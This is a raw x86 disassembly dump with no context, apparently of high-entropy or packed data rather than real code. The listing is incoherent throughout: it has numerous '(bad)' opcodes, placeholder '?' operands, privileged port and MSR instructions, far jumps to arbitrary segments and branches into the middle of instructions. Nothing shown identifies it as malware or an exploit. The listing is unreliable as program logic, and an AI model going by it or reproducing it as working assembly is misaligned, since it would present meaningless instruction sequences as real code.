  411197:	shl    DWORD PTR [edi-0x5d],0x1a
  41119b:	les    ebp,FWORD PTR [eax-0x71]
  41119e:	mov    ds:0xfee293f3,al
  4111a3:	xor    al,0xc
  4111a5:	inc    edi
  4111a6:	mov    WORD PTR [ebx+0x15],?
  4111a9:	mov    dh,0xa6
  4111ab:	adc    bl,BYTE PTR [ecx+0x53361e1c]
  4111b1:	xchg   BYTE PTR [edi+0x61],dl
  4111b4:	sub    eax,0xd5f20049
  4111b9:	pop    ebx
  4111ba:	pop    DWORD PTR [ecx-0x6]
  4111bd:	daa    
  4111be:	xchg   ecx,eax
  4111bf:	pop    ds
  4111c0:	scas   eax,DWORD PTR es:[edi]
  4111c1:	cmp    eax,0xcf065250
  4111c6:	jmp    0xc9fb1490
  4111cb:	adc    eax,0x1cd33a80
  4111d0:	adc    dl,BYTE PTR [eax+0x7e]
  4111d3:	xchg   edx,eax
  4111d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d5:	scas   eax,DWORD PTR es:[edi]
  4111d6:	fwait
  4111d7:	mov    ebx,0xe9c192de
  4111dc:	lahf   
  4111dd:	enter  0xb995,0x54
  4111e1:	push   edi
  4111e2:	xor    BYTE PTR [ebx+0x439390],cl
  4111e8:	lea    ebx,[eax]
  4111ea:	pop    esp
  4111eb:	push   esi
  4111ec:	xor    DWORD PTR [esp+ebx*8+0x55],edi
  4111f0:	adc    eax,0xb4c190c4
  4111f5:	stos   BYTE PTR es:[edi],al
  4111f6:	add    al,0x3e
  4111f8:	cmc    
  4111f9:	dec    esp
  4111fa:	dec    ebp
  4111fb:	mov    ds:0xcf696436,al
  411200:	mov    ebp,0xb2af06d9
  411205:	xchg   edx,eax
  411206:	ins    BYTE PTR es:[edi],dx
  411207:	push   0xfffffff2
  411209:	ror    BYTE PTR [eax],cl
  41120b:	and    eax,DWORD PTR [ecx]
  41120d:	(bad)  
  41120e:	mov    ebp,0x73179586
  411213:	pop    es
  411214:	scas   eax,DWORD PTR es:[edi]
  411215:	mov    ecx,0x3b8fd853
  41121a:	push   ebp
  41121b:	and    ch,BYTE PTR [ecx+ebx*4]
  41121e:	leave  
  41121f:	jp     0x41128b
  411221:	dec    edi
  411222:	ja     0x41129c
  411224:	jg     0x41122e
  411226:	jecxz  0x411293
  411228:	and    al,BYTE PTR [eax+0x5e199164]
  41122e:	daa    
  41122f:	and    al,0x88
  411231:	and    DWORD PTR ds:0xb657bca8,edx
  411237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411238:	ds mov esp,0x3d8bb551
  41123e:	mov    al,0xe2
  411240:	mov    ds:0x6b5f2303,eax
  411245:	retf   
  411246:	mov    dh,0xa1
  411248:	jnp    0x4111e2
  41124a:	rcl    DWORD PTR ds:0x6ffab9fe,1
  411250:	or     esp,ecx
  411252:	mov    fs,ebx
  411254:	aas    
  411255:	mov    edx,0xe158ddf2
  41125a:	cld    
  41125b:	fdivr  QWORD PTR [eax]
  41125d:	xor    eax,0x8484996b
  411262:	or     esi,DWORD PTR [ebx+0x0]
  411265:	mov    WORD PTR [ebp+eax*2-0x7f],ss
  411269:	dec    eax
  41126a:	mov    eax,0x65934a7d
  41126f:	jno    0x411240
  411271:	push   esp
  411272:	mov    dl,0x6f
  411274:	cwde   
  411275:	adc    al,0x88
  411277:	or     eax,0x7a6a6289
  41127c:	pop    esi
  41127d:	cmp    DWORD PTR [ebx],esp
  41127f:	cmp    edx,DWORD PTR [ebx-0x77]
  411282:	lock sub al,ch
  411285:	in     al,0x28
  411287:	push   0xeb34885a
  41128c:	or     edi,ebp
  41128e:	add    DWORD PTR [ecx],edi
  411290:	aaa    
  411291:	mov    edi,0x6417b57f
  411296:	(bad)  
  411297:	pusha  
  411298:	int3   
  411299:	or     cl,ah
  41129b:	test   al,0x2a
  41129d:	inc    edx
  41129e:	sbb    bh,BYTE PTR [edx]
  4112a0:	dec    ebp
  4112a1:	xchg   edx,eax
  4112a2:	mov    eax,ds:0x3a7b7326
  4112a7:	xchg   edx,eax
  4112a8:	mov    fs,WORD PTR [ebp+esi*2+0x1a]
  4112ac:	sbb    DWORD PTR [eax+ecx*8+0x28],ebp
  4112b0:	cmp    edx,DWORD PTR [ecx]
  4112b2:	and    eax,0x3d0985d4
  4112b7:	mov    ch,0x88
  4112b9:	ret    0x7d5
  4112bc:	fwait
  4112bd:	add    bh,BYTE PTR [edx]
  4112bf:	inc    edi
  4112c0:	call   DWORD PTR [edx]
  4112c2:	fwait
  4112c3:	aad    0x1f
  4112c5:	pop    esp
  4112c6:	and    eax,0x74c3e451
  4112cb:	sub    ch,cl
  4112cd:	sbb    ebx,0xe1d0bef3
  4112d3:	mov    cl,0x6b
  4112d5:	xor    al,0x2b
  4112d7:	leave  
  4112d8:	mov    cl,0xf
  4112da:	sti    
  4112db:	call   0x3f95:0xce402d78
  4112e2:	sbb    al,0xef
  4112e4:	or     eax,0xe6fbc4b0
  4112e9:	adc    ecx,DWORD PTR [ebp+0x29e075f2]
  4112ef:	inc    edx
  4112f0:	jmp    0xb9f9:0xb5a098cf
  4112f7:	lds    edi,FWORD PTR [ebx-0x178e5bd5]
  4112fd:	inc    ebp
  4112fe:	daa    
  4112ff:	cld    
  411300:	in     eax,0xe0
  411302:	dec    eax
  411303:	(bad)
  411307:	xchg   edx,eax
  411308:	les    edx,FWORD PTR [esi]
  41130a:	bound  eax,QWORD PTR [ecx-0x63ce24be]
  411310:	out    0xd9,al
  411312:	les    esp,FWORD PTR [edx+0x5d]
  411315:	clc    
  411316:	fdivp  st(0),st
  411318:	xchg   ecx,eax
  411319:	push   edi
  41131a:	and    BYTE PTR [edi+eax*1],cl
  41131d:	es scas eax,DWORD PTR es:[edi]
  41131f:	xor    bh,ah
  411321:	ror    BYTE PTR [ebp-0x7e92de69],1
  411327:	add    BYTE PTR [ebp-0x71],ch
  41132a:	test   eax,0xb10521f3
  41132f:	sbb    al,bh
  411331:	mov    ds:0xa0ac0d94,al
  411336:	push   esi
  411337:	cld    
  411338:	(bad)  
  411339:	mov    edi,0x2789b82c
  41133e:	sbb    eax,0xc0d9e8a
  411343:	mov    edi,0xe5375a4
  411348:	repz xor DWORD PTR [ebx],edi
  41134b:	in     eax,0xa7
  41134d:	mov    bh,0x3f
  41134f:	ror    DWORD PTR [edx],0x6d
  411352:	jp     0x41132e
  411354:	push   ss
  411355:	mov    dh,dh
  411357:	lahf   
  411358:	jb     0x41130d
  41135a:	imul   ecx,DWORD PTR [ebp+0x45],0x39
  41135e:	retf   
  41135f:	push   esp
  411360:	dec    ebx
  411361:	sbb    eax,0xe0f9ffe6
  411366:	or     cl,BYTE PTR [eax]
  411368:	outs   dx,DWORD PTR ds:[esi]
  411369:	pop    edx
  41136a:	(bad)  
  41136b:	repz push 0xac591105
  411371:	out    0x1c,al
  411373:	loopne 0x411323
  411375:	cmp    eax,0x15c9cc38
  41137a:	and    al,0x48
  41137c:	fcmovnb st,st(6)
  41137e:	mov    bh,0xe4
  411380:	sar    DWORD PTR [edi-0x55],1
  411383:	or     al,0xd8
  411385:	xor    edi,ebp
  411387:	jp     0x4113ae
  411389:	fadd   QWORD PTR ds:[ebx]
  41138c:	mov    esp,0x24e58e71
  411391:	xlat   BYTE PTR ds:[ebx]
  411392:	dec    eax
  411393:	xor    al,cl
  411395:	mov    gs,WORD PTR [edi-0x6020fc02]
  41139b:	cmp    BYTE PTR [esi-0x1deb4d2],0x58
  4113a2:	stos   DWORD PTR es:[edi],eax
  4113a3:	shr    BYTE PTR [edx+0x17],0x1f
  4113a7:	push   es
  4113a8:	rcr    al,cl
  4113aa:	cmp    BYTE PTR [esi],ch
  4113ac:	or     al,0xc2
  4113ae:	enter  0x902e,0x18
  4113b2:	cli    
  4113b3:	mov    al,ds:0xcf0abf5f
  4113b8:	mov    bl,0x9f
  4113ba:	ins    BYTE PTR es:[edi],dx
  4113bb:	mov    bl,0xea
  4113bd:	mov    ah,0xfd
  4113bf:	or     eax,0xc744f0ad
  4113c4:	adc    al,0x19
  4113c6:	ss pop ebx
  4113c8:	fadd   DWORD PTR [ebx+0x76]
  4113cb:	in     al,0x51
  4113cd:	dec    edi
  4113ce:	lock icebp 
  4113d0:	inc    ecx
  4113d1:	outs   dx,BYTE PTR ds:[esi]
  4113d2:	xchg   ecx,eax
  4113d3:	stc    
  4113d4:	dec    ecx
  4113d5:	dec    esp
  4113d6:	test   DWORD PTR [edx+0x51],ebp
  4113d9:	sub    eax,0x93a6c25e
  4113de:	out    0xc8,al
  4113e0:	aam    0xb5
  4113e2:	outs   dx,DWORD PTR ds:[esi]
  4113e3:	pop    ds
  4113e4:	add    DWORD PTR [ebp-0x1c1f6449],esi
  4113ea:	adc    eax,0xc5f0b116
  4113ef:	or     esp,ecx
  4113f1:	loopne 0x4113af
  4113f3:	ror    DWORD PTR [eax+0x5aa2b2e8],0x66
  4113fa:	in     eax,dx
  4113fb:	cs daa 
  4113fd:	(bad)  [ebp-0x608fa644]
  411403:	add    BYTE PTR [esp+eax*4-0x47],bl
  411407:	xor    BYTE PTR [edi+0x6],bl
  41140a:	jns    0x41147e
  41140c:	out    0x9c,eax
  41140e:	mov    ch,0x80
  411410:	xchg   edx,eax
  411411:	pop    ds
  411412:	xchg   ecx,eax
  411413:	cs aad 0xa
  411416:	adc    eax,0x323ebbf7
  41141b:	inc    ebx
  41141c:	fisttp DWORD PTR [esi+0x3bbb2317]
  411422:	mov    WORD PTR fs:[ebx],ss
  411425:	jo     0x4113f5
  411427:	add    dl,ch
  411429:	jo     0x411454
  41142b:	data16 mov cl,0xbe
  41142e:	sub    eax,0x9c15669a
  411433:	sbb    BYTE PTR [esi],cl
  411435:	xchg   edi,eax
  411436:	out    0xc,al
  411438:	dec    ecx
  411439:	nop
  41143a:	push   esp
  41143b:	pop    ecx
  41143c:	sub    al,0x30
  41143e:	ds cmp eax,0x3de2dc59
  411444:	xchg   dl,cl
  411446:	cmp    DWORD PTR [edx-0x2a1b8223],edi
  41144c:	ret    
  41144d:	cmp    DWORD PTR [eax+ecx*1+0x5a],ebx
  411451:	inc    eax
  411452:	inc    edx
  411453:	xchg   ebp,eax
  411454:	adc    DWORD PTR [ebp+0x677b9e6e],0x6e
  41145b:	mov    esi,0x7bfb2f6b
  411460:	mov    ?,WORD PTR [edx+eax*4]
  411463:	cmp    eax,0x4ec6eded
  411468:	mov    al,ds:0xe82c3b5
  41146d:	sti    
  41146e:	mov    cl,0x4c
  411470:	cmp    ecx,DWORD PTR [ebx+0x71]
  411473:	jo     0x411445
  411475:	ss adc al,0x1b
  411478:	adc    dh,dl
  41147a:	aad    0xc5
  41147c:	inc    ebp
  41147d:	jns    0x4114a6
  41147f:	test   ebp,eax
  411481:	mov    DWORD PTR [edx],ebx
  411483:	scas   eax,DWORD PTR es:[edi]
  411484:	cs scas eax,DWORD PTR es:[edi]
  411486:	syscall 
  411488:	mov    al,ds:0x9fd606d8
  41148d:	sub    DWORD PTR [edx-0x7a16a390],ecx
  411493:	leave  
  411494:	rcl    DWORD PTR [ecx],1
  411496:	lds    ebp,FWORD PTR [edx+0x1437ffd3]
  41149c:	js     0x4114f3
  41149e:	addr16 mov dl,0x43
  4114a1:	pop    edi
  4114a2:	out    dx,al
  4114a3:	and    al,0x23
  4114a5:	mov    ah,0xac
  4114a7:	push   ebx
  4114a8:	sbb    al,0x42
  4114aa:	shl    eax,0xdb
  4114ad:	cld    
  4114ae:	add    eax,0x808bd538
  4114b3:	jmp    0x715cc7fa
  4114b8:	xchg   edx,eax
  4114b9:	jmp    0x50a4:0xc3712352
  4114c0:	inc    edx
  4114c1:	cmp    DWORD PTR [ebp-0x23],esp
  4114c4:	mov    al,ds:0xe7aeb6f8
  4114c9:	pushf  
  4114ca:	add    esi,esp
  4114cc:	je     0x41150d
  4114ce:	div    BYTE PTR [edi+ebp*4-0x22]
  4114d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d3:	sub    BYTE PTR ds:[edx],dl
  4114d6:	xchg   esi,eax
  4114d7:	xor    ebp,DWORD PTR ds:0x34398c83
  4114dd:	adc    bh,bl
  4114df:	aaa    
  4114e0:	aaa    
  4114e1:	cli    
  4114e2:	xchg   ebx,eax
  4114e3:	and    BYTE PTR [ebx+0x2e50ef5],ch
  4114e9:	sub    esp,DWORD PTR [esi+0x11]
  4114ec:	aaa    
  4114ed:	add    BYTE PTR [esi+0x62],0x31
  4114f1:	cdq    
  4114f2:	enter  0xd1f0,0xd9
  4114f6:	jmp    0x411509
  4114f8:	pop    es
  4114f9:	ja     0x41147b
  4114fb:	xor    DWORD PTR ds:0xa8e5a5ca,ebp
  411501:	enter  0x2413,0xfc
  411505:	and    DWORD PTR [eax-0x1206c818],0x1efcd0ea
  41150f:	dec    esp
  411510:	cmp    DWORD PTR [ebx],0x2b
  411513:	(bad)  
  411514:	xchg   ecx,eax
  411515:	sub    BYTE PTR [ecx],0x49
  411518:	pop    esi
  411519:	jmp    FWORD PTR [edi+esi*2]
  41151c:	imul   edi,DWORD PTR [eax+0x61],0x64
  411520:	fld    QWORD PTR [edx]
  411522:	test   al,0x29
  411524:	ins    BYTE PTR es:[edi],dx
  411525:	dec    edi
  411526:	nop
  411527:	xor    eax,DWORD PTR [esi-0x3]
  41152a:	scas   eax,DWORD PTR es:[edi]
  41152b:	outs   dx,BYTE PTR ds:[esi]
  41152c:	lock loope 0x411544
  41152f:	mov    al,ch
  411531:	mov    eax,ds:0x8ec3d154
  411536:	cmp    esp,ecx
  411538:	jae    0x4114f6
  41153a:	rcl    DWORD PTR [edx+0x47],cl
  41153d:	outs   dx,DWORD PTR ds:[esi]
  41153e:	cld    
  41153f:	jmp    0x588e:0x9ff0e756
  411546:	and    DWORD PTR [ecx+0x68],0x21
  41154a:	dec    edi
  41154b:	mov    DWORD PTR [ebp+0x7b],ebx
  41154e:	adc    al,0x17
  411550:	aaa    
  411551:	xchg   esp,eax
  411552:	inc    ebx
  411553:	mov    dl,0xa0
  411555:	inc    ecx
  411556:	add    ecx,DWORD PTR [ecx+0x1a8cf912]
  41155c:	adc    al,dh
  41155e:	xlat   BYTE PTR ds:[ebx]
  41155f:	test   BYTE PTR [edi],ah
  411561:	popf   
  411562:	mov    ch,0x59
  411564:	pop    ebp
  411565:	(bad)  
  411567:	sar    BYTE PTR [ebx+eiz*2+0x5bd380eb],1
  41156e:	pusha  
  41156f:	xchg   esp,eax
  411570:	pop    ecx
  411571:	fistp  DWORD PTR [edx-0x54]
  411574:	cmp    DWORD PTR [esp+ebp*1-0x36],edi
  411578:	lock out dx,al
  41157a:	xchg   ecx,eax
  41157b:	mov    ebp,0xbcfd17db
  411580:	lahf   
  411581:	mov    ch,0xfc
  411583:	mov    eax,0x7d8957cc
  411588:	inc    ecx
  411589:	loopne 0x4115ea
  41158b:	or     BYTE PTR [ebx+edx*4],ch
  41158e:	scas   al,BYTE PTR es:[edi]
  41158f:	adc    al,0xd6
  411591:	jecxz  0x411554
  411593:	out    0xdc,eax
  411595:	(bad)  [ecx+0x6a]
  411598:	adc    eax,0x1c363273
  41159d:	dec    ebx
  41159e:	je     0x41161a
  4115a0:	xchg   ebp,eax
  4115a1:	data16 cmp ch,BYTE PTR cs:[eax]
  4115a5:	jecxz  0x411552
  4115a7:	loop   0x411564
  4115a9:	retf   0xe4bf
  4115ac:	dec    esp
  4115ad:	call   0xb87e:0xf4712576
  4115b4:	je     0x4115cc
  4115b6:	cdq    
  4115b7:	arpl   WORD PTR [edx+0x29],di
  4115ba:	mov    eax,0x7477a79c
  4115bf:	mov    edx,0x2833dddb
  4115c4:	or     esi,DWORD PTR [ecx+0x7bdbc4bb]
  4115ca:	int    0x8d
  4115cc:	mov    ds:0xa1a068bb,eax
  4115d1:	and    al,0x4a
  4115d3:	(bad)  
  4115d4:	in     al,dx
  4115d5:	xchg   ebp,eax
  4115d6:	fdiv   st,st(2)
  4115d8:	std    
  4115d9:	(bad)  
  4115da:	jmp    DWORD PTR [esi+0x272babe5]
  4115e0:	push   DWORD PTR [eax+0x31]
  4115e3:	nop
  4115e4:	ja     0x41157b
  4115e6:	mov    bl,0x94
  4115e8:	sub    al,0x62
  4115ea:	cmp    ah,BYTE PTR [edx+0x35]
  4115ed:	jmp    0x1beaa63c
  4115f2:	jg     0x4115eb
  4115f4:	arpl   ax,di
  4115f6:	ficomp WORD PTR [edi-0x5d]
  4115f9:	jo     0x411639
  4115fb:	lods   al,BYTE PTR ds:[esi]
  4115fc:	jmp    0xd2d9:0x46e1e977
  411603:	xor    eax,0xfc33238e
  411608:	pop    edi
  411609:	add    ecx,esp
  41160b:	inc    edi
  41160c:	cli    
  41160d:	add    DWORD PTR fs:[eax],0x70
  411611:	mov    bl,0x42
  411613:	mov    ds:0x7410871,eax
  411618:	mov    WORD PTR [ebx+0x7a],ds
  41161b:	sbb    bh,BYTE PTR [edi-0x53]
  41161e:	lds    edi,FWORD PTR [ecx+0x5e19a9b6]
  411624:	sbb    ecx,ecx
  411626:	jl     0x411635
  411628:	or     DWORD PTR [edx+0xaed749b],ebx
  41162e:	sub    esi,DWORD PTR [ecx+ebx*1-0x67d9d23a]
  411635:	cmp    eax,0x5d9e4771
  41163a:	scas   al,BYTE PTR es:[edi]
  41163b:	dec    ebx
  41163c:	push   eax
  41163d:	stc    
  41163e:	gs sub eax,0x8a1b8f47
  411644:	pushf  
  411645:	cs inc ecx
  411647:	push   es
  411648:	push   es
  411649:	fwait
  41164a:	outs   dx,DWORD PTR ds:[esi]
  41164b:	(bad)  
  41164d:	in     eax,dx
  41164e:	cmp    dl,BYTE PTR [eax+ebx*4-0x252bb6a0]
  411655:	daa    
  411656:	inc    edx
  411657:	xchg   esp,eax
  411658:	push   eax
  411659:	mov    ch,0xa6
  41165b:	cmp    bh,ah
  41165d:	fwait
  41165e:	add    BYTE PTR [ebp+0x48],ah
  411661:	mov    ah,0x95
  411663:	(bad)  
  411664:	add    DWORD PTR [edi+edx*1+0x6c145090],edx
  41166b:	rcl    DWORD PTR [eax],0x5b
  41166e:	wrmsr  
  411670:	fst    QWORD PTR [ebx+0x8405443]
  411676:	pushf  
  411677:	add    edi,DWORD PTR [ebx]
  411679:	mov    al,ds:0x67e43765
  41167e:	js     0x4116df
  411680:	retf   
  411681:	and    BYTE PTR [edx+edx*2],ah
  411684:	mov    ecx,0x27da9e7f
  411689:	jmp    0x41164d
  41168b:	fs shl dl,cl
  41168e:	sub    cl,al
  411690:	pop    ds
  411691:	stos   DWORD PTR es:[edi],eax
  411692:	xor    eax,0x31
  411695:	les    ecx,FWORD PTR [eax+0x3c0c4024]
  41169b:	call   0x328a9e46
  4116a0:	leave  
  4116a1:	leave  
  4116a2:	addr16 cld 
  4116a4:	push   edx
  4116a5:	cmp    ah,ah
  4116a7:	push   eax
  4116a8:	xlat   BYTE PTR ds:[ebx]
  4116a9:	(bad)  
  4116aa:	cdq    
  4116ab:	iret   
  4116ac:	jl     0x4116be
  4116ae:	sbb    al,BYTE PTR [edi+eax*1-0x22004e4e]
  4116b5:	inc    edx
  4116b6:	adc    al,0xc1
  4116b8:	out    dx,eax
  4116b9:	xchg   DWORD PTR [ebp-0x18ea54ec],esp
  4116bf:	pop    eax
  4116c0:	lods   eax,DWORD PTR ds:[esi]
  4116c1:	pop    eax
  4116c2:	ja     0x4116f1
  4116c4:	sbb    DWORD PTR [edi-0x73],ebp
  4116c7:	jbe    0x411700
  4116c9:	pop    ds
  4116ca:	or     esp,esp
  4116cc:	xor    BYTE PTR [esi+0x2a],ah
  4116cf:	std    
  4116d0:	stos   BYTE PTR es:[edi],al
  4116d1:	inc    esp
  4116d2:	jmp    DWORD PTR [eax+eiz*1]
  4116d5:	mov    ds:0xfa626cbf,al
  4116da:	jb     0x4116d1
  4116dc:	mov    esi,0xe6c27d11
  4116e1:	stc    
  4116e2:	loop   0x4116c4
  4116e4:	loope  0x4116bf
  4116e6:	fcomip st,st(3)
  4116e8:	idiv   BYTE PTR [eax+eiz*8+0x7c]
  4116ec:	mov    esi,0x6c0bedc7
  4116f1:	jge    0x4116a0
  4116f3:	jbe    0x411734
  4116f5:	push   0x6b
  4116f7:	adc    al,0x59
  4116f9:	scas   al,BYTE PTR es:[edi]
  4116fa:	mov    bl,0x29
  4116fc:	adc    cl,BYTE PTR [edi]
  4116fe:	or     ah,cl
  411700:	mov    ah,0x3b
  411702:	jecxz  0x411715
  411704:	mov    dh,0x90
  411706:	and    ch,ch
  411708:	repnz pop esp
  41170a:	jge    0x411750
  41170c:	mov    bl,0x4a
  41170e:	call   0x1544:0xf1d1c059
  411715:	sub    ecx,DWORD PTR ds:0xdbb60339
  41171b:	pop    esi
  41171c:	enter  0xd201,0xe7
  411720:	fwait
  411721:	inc    esp
  411722:	cld    
  411723:	cmp    al,0xf2
  411725:	mov    esi,0x4f64449d
  41172a:	mov    edi,0xbc335c34
  41172f:	adc    DWORD PTR [esp+0x5b],eax
  411733:	cmp    al,0x49
  411735:	ins    BYTE PTR es:[edi],dx
  411736:	sub    dh,ah
  411738:	jl     0x4117b6
  41173a:	shl    BYTE PTR [ecx-0x3],1
  41173d:	fild   WORD PTR [edx+0x314320ea]
  411743:	pop    ss
  411744:	adc    BYTE PTR [ebp-0xc],al
  411747:	(bad)  
  411748:	dec    ebp
  411749:	aad    0x53
  41174b:	dec    ebx
  41174c:	dec    eax
  41174d:	mov    ds,WORD PTR [ebp-0x6c7967fd]
  411753:	lods   eax,DWORD PTR ds:[esi]
  411754:	test   BYTE PTR [edi],cl
  411756:	addr16 inc ebx
  411758:	std    
  411759:	retf   0x991e
  41175c:	pop    esp
  41175d:	push   es
  41175e:	in     al,dx
  41175f:	jecxz  0x4117df
  411761:	xchg   edx,eax
  411762:	and    BYTE PTR ds:0x36deca98,dh
  411768:	sub    al,0x49
  41176a:	fcom   DWORD PTR [ebx]
  41176c:	out    dx,al
  41176d:	test   bl,ah
  41176f:	ja     0x411775
  411771:	add    ebx,esi
  411773:	jb     0x41178a
  411775:	or     eax,0x30707a20
  41177a:	mov    edi,0x2bc80492
  41177f:	shl    DWORD PTR [edx-0x251a2328],cl
  411785:	xor    DWORD PTR [eax+0x8544a48],esp
  41178b:	loopne 0x4117b5
  41178d:	add    eax,0x3e2e80cb
  411792:	sub    BYTE PTR [eax-0x4db834af],cl
  411798:	loop   0x41179b
  41179a:	jae    0x4117df
  41179c:	dec    edi
  41179d:	cwde   
  41179e:	test   eax,0xb9a8d8aa
  4117a3:	xor    BYTE PTR [ecx-0x71],0x93
  4117a7:	mul    ah
  4117a9:	adc    DWORD PTR [ebx-0x39],0x3d067b13
  4117b0:	aaa    
  4117b1:	cmp    eax,0xdc83b42f
  4117b6:	jbe    0x4117dc
  4117b8:	pushf  
  4117b9:	fwait
  4117ba:	xchg   edx,eax
  4117bb:	call   0x534e:0x858c9c5e
  4117c2:	jae    0x4117ca
  4117c4:	in     eax,0x86
  4117c6:	push   edi
  4117c7:	sti    
  4117c8:	cs or  bl,bh
  4117cb:	mov    edi,0xd6537fb0
  4117d0:	lods   eax,DWORD PTR ds:[esi]
  4117d1:	mul    DWORD PTR [ecx]
  4117d3:	test   eax,0xff0c1895
  4117d8:	or     dl,ah
  4117da:	mov    ch,0xb8
  4117dc:	out    0x0,al
  4117de:	or     cl,BYTE PTR [ebx+esi*2+0x7e88b4fd]
  4117e5:	push   eax
  4117e6:	xchg   ecx,eax
  4117e7:	push   esi
  4117e8:	stos   DWORD PTR es:[edi],eax
  4117e9:	mov    esp,0x13a22f46
  4117ee:	inc    esi
  4117ef:	or     esi,ecx
  4117f1:	adc    eax,0x60f17482
  4117f6:	lods   eax,DWORD PTR ds:[esi]
  4117f7:	les    edi,FWORD PTR [eax-0x3565bd2c]
  4117fd:	mov    ?,WORD PTR [ebx+esi*2-0x1b233f3a]
  411804:	jle    0x4117e2
  411806:	rol    dl,1
  411808:	inc    eax
  411809:	out    0x46,al
  41180b:	jle    0x4117ef
  41180d:	mov    ebp,DWORD PTR [esi+0x17]
  411810:	imul   ecx,DWORD PTR [ebp+0x1b27bea6],0xffcb1233
  41181a:	pop    ds
  41181b:	mov    esi,ds
  41181d:	add    DWORD PTR [ecx-0x17],edi
  411820:	test   DWORD PTR [esi-0x6ca99e82],edx
  411826:	in     eax,0x3
  411828:	push   esp
  411829:	inc    ecx
  41182a:	popa   
  41182b:	int    0x6d
  41182d:	inc    edi
  41182e:	test   DWORD PTR ds:0x30290ba,0x4248abfd
  411838:	jne    0x411869
  41183a:	xchg   esp,eax
  41183b:	xchg   ebx,eax
  41183c:	add    eax,0xa0f128
  411841:	mov    edi,0x9f537db2
  411846:	push   ss
  411847:	mov    bh,0xf0
  411849:	cli    
  41184a:	jo     0x4118ca
  41184c:	pushf  
  41184d:	imul   edi,DWORD PTR [ebx-0x7d],0xa34ae6e6
  411854:	lock and eax,0xfb3eface
  41185a:	pop    ebp
  41185b:	jo     0x4118b3
  41185d:	call   0x926d:0x22cbc333
  411864:	cs out 0x31,al
  411867:	and    DWORD PTR [ecx+0x10348846],esp
  41186d:	mov    esi,0xab24f82e
  411872:	jb     0x411886
  411874:	inc    ebp
  411875:	hlt    
  411876:	and    ch,BYTE PTR [ebp-0x25]
  411879:	xchg   BYTE PTR [esi+0x4d],dh
  41187c:	cmp    bl,BYTE PTR [edi]
  41187e:	adc    ah,BYTE PTR [ebx]
  411880:	cmp    eax,DWORD PTR [edx]
  411882:	retf   
  411883:	mov    dl,0x55
  411885:	mov    al,0xf
  411887:	sar    BYTE PTR [eax-0x3442d290],1
  41188d:	push   cs
  41188e:	out    dx,al
  41188f:	mov    WORD PTR es:0x976029db,sp
  411897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411898:	mov    dl,BYTE PTR [esi-0x7b34c40]
  41189e:	jmp    0x41186b
  4118a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118a1:	xchg   edi,eax
  4118a2:	mov    WORD PTR [edx+edx*8+0x5d9415ff],ds
  4118a9:	jbe    0x41185d
  4118ab:	and    ah,BYTE PTR [eax+eiz*1-0x43]
  4118af:	adc    BYTE PTR [edx],bl
  4118b1:	push   eax
  4118b2:	jmp    0x411919
  4118b4:	sub    edx,DWORD PTR [eax-0x78]
  4118b7:	into   
  4118b8:	or     dh,al
  4118ba:	arpl   WORD PTR [edx+0xe15acfe],bp
  4118c0:	clc    
  4118c1:	adc    BYTE PTR [edi+0x6d563a5a],0x10
  4118c8:	xor    DWORD PTR [edi+esi*4],0x539b42b
  4118cf:	enter  0xbed8,0xd3
  4118d3:	call   0x46fe4551
  4118d8:	push   esp
  4118d9:	pop    esi
  4118da:	adc    BYTE PTR [ebp+0x4cc59c96],0xba
  4118e1:	arpl   WORD PTR [edx-0x5a],sp
  4118e4:	ret    0xd9a7
  4118e7:	fwait
  4118e8:	stos   DWORD PTR es:[edi],eax
  4118e9:	iret   
  4118ea:	push   ebp
  4118eb:	mov    ds:0x15c1d51,al
  4118f0:	js     0x4118b1
  4118f2:	sub    al,ch
  4118f4:	popf   
  4118f5:	test   eax,0xbace947e
  4118fa:	pop    ebx
  4118fb:	jns    0x41194e
  4118fd:	popa   
  4118fe:	jbe    0x4118fe
  411900:	mov    cl,0x3a
  411902:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411903:	pop    ecx
  411904:	dec    eax
  411905:	cdq    
  411906:	(bad)  
  411907:	mov    ebx,0x37be8249
  41190c:	(bad)  
  41190d:	mov    dl,0x25
  41190f:	fwait
  411910:	mov    BYTE PTR [ebx],dl
  411912:	shr    BYTE PTR [edi+eax*8-0x61],cl
  411916:	dec    si
  411918:	xor    dl,BYTE PTR [ecx]
  41191a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41191b:	xor    DWORD PTR [ecx+0xb0d453b],0x9210e9f9
  411925:	push   es
  411926:	shr    bl,0x36
  411929:	push   0x2fb07a2a
  41192e:	jp     0x4118e8
  411930:	outs   dx,BYTE PTR ds:[esi]
  411931:	rcl    BYTE PTR [eax+eax*1+0x6bd3830d],1
  411938:	ror    DWORD PTR [edx+0x11],1
  41193b:	rcl    DWORD PTR [ebx-0x9a3c056],0x9
  411942:	rcl    BYTE PTR [ebx-0x6d625a02],cl
  411948:	pop    ebx
  411949:	arpl   dx,si
  41194b:	iret   
  41194c:	int    0x83
  41194e:	jmp    0x4118e2
  411950:	cmp    eax,0xbf8c377
  411955:	adc    DWORD PTR [edi+0x39],edx
  411958:	ficom  WORD PTR [esp+ecx*1-0x46]
  41195c:	and    BYTE PTR [ebx+0x75],bh
  41195f:	loope  0x4119bb
  411961:	es push eax
  411963:	and    esi,DWORD PTR [esi]
  411965:	stos   DWORD PTR es:[edi],eax
  411966:	shl    DWORD PTR [esi-0x10e3721c],0xfd
  41196d:	sub    al,0x8
  41196f:	sub    dh,0x1a
  411972:	pop    ecx
  411973:	mov    al,ds:0xb83d16b9
  411978:	xor    edi,ebx
  41197a:	dec    BYTE PTR [edx-0x35]
  41197d:	mov    BYTE PTR [eax],dh
  41197f:	mov    ds:0x7b3b912c,eax
  411984:	imul   DWORD PTR [edx]
  411986:	adc    esi,0xcf38ada3
  41198c:	data16 jno 0x411920
  41198f:	push   0x6d4691ca
  411994:	jecxz  0x4119ba
  411996:	in     al,0x1d
  411998:	bound  esp,QWORD PTR [esi+0x52ea6f84]
  41199e:	aas    
  41199f:	ja     0x4119b7
  4119a1:	mov    ds:0x371cf6bb,al
  4119a6:	cmc    
  4119a7:	dec    ebx
  4119a8:	mov    ds,WORD PTR [ebx+0x71]
  4119ab:	lahf   
  4119ac:	aas    
  4119ad:	pusha  
  4119ae:	and    eax,0x95ec6ca
  4119b3:	stos   DWORD PTR es:[edi],eax
